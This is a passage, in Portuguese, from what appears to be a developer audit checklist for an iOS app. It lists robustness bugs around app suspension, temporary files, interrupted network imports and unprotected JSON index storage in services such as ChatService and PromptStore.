`audio.m4a` truncado — o pipeline de transcrição lê um ficheiro inválido e falha. (b) **Sem `expirationHandler` para salvar estado.** Mesmo que `beginBackgroundTask` fosse registado, o sistema dá ~30 segundos antes de matar o app. O `expirationHandler` deveria cancelar o export, fazer flush do estado atual, e agendar retry. Nenhuma operação implementa isto. (c) **Interrupção durante `prepareForRecognition` deixa PCM temporário órfão.** Se o utilizador sai do app durante a conversão AAC→PCM, o ficheiro `pcm_<uuid>.wav` em `/tmp` fica parcialmente escrito. Na próxima tentativa, `prepareForRecognition` cria um NOVO ficheiro temporário sem verificar se o anterior existe — acumulando lixo em `/tmp`. (d) **Interrupção durante pipeline corrompe `analysis.json`.** Se o `WriteAnalysisTool` está a escrever `analysis.json` (`.atomic` write → temp file → rename) e o app é suspenso após o rename mas antes do flush do filesystem, o ficheiro pode ficar com 0 bytes ou JSON parcial. (e) **Sem `BGTaskScheduler` para pipeline em background.** O pipeline de transcrição/análise poderia continuar em background via `BGProcessingTask` — mas o `BGTaskScheduler` não é registado. Todos os pipelines param quando o app vai para background. (f) **Interrupção de rede durante import remoto.** Se o utilizador importa de uma URL (ex: `importFromURL` com URL remota), e a rede cai a meio, o `Data(contentsOf:)` falha — mas o item já foi criado no SwiftData. Fica um item `status: .draft` sem conteúdo, que o utilizador depois tem de limpar manualmente. (g) **Interrupção do sistema (reboot, update) durante qualquer file op.** Nenhum ficheiro de lock ou sentinel é usado para detetar que uma operação foi interrompida. - [ ] **[#26] [P1] Armazenamento baseado em ficheiros JSON sem proteção contra corrupção — `ChatService`, `PromptStore`, `AnalysisSkillStore`, e `AgentMemoryStore` usam ficheiros únicos como índice global que, se corrompidos, causam perda total dos dados mesmo com ficheiros individuais intactos no disco.** Quatro serviços críticos usam o mesmo padrão de armazenamento: um ficheiro JSON central que agrega TODOS os registos, escrito com `.atomic` write mas sem backup, sem rotação, sem checksum, e sem rebuild a partir de fontes primárias.
